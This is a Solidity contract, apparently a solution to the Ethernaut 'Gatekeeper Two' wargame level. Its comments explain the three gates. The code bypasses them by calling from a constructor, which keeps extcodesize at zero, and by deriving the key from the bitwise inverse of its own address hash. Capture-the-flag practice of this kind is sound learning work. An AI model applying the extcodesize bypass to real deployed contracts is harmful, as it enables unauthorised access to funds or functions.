// # Ethernaut 14: Gatekeeper Two
//
// The three gates of `Gatekeeper Two`:
// 1. `msg.sender` must not be `tx.origin` (as in `Telephone`).
// 2. The attacker contract's `extcodesize` must be zero. This is achieved by not having any
//    code apart from the constructor, which goes into the deployment bytecode and does not
//    count towards `extcodesize`.
// 3. The first 8 bytes of the keccak hash of `msg.sender` (= the attacker contract's address)
//    must be equal to the bitwise inverse of the key.

pragma solidity ^0.6.0;

import "./14_GatekeeperTwo.sol";

import "hardhat/console.sol";

contract GatekeeperTwoAttack {
    constructor (address instanceAddr) public {
        GatekeeperTwo instance = GatekeeperTwo(instanceAddr);

        bytes32 _hash = keccak256(abi.encodePacked(address(this)));
        uint64 ukey = ~uint64(bytes8(_hash));
        bytes8 key = bytes8(ukey);

        instance.enter(key);
    }
}
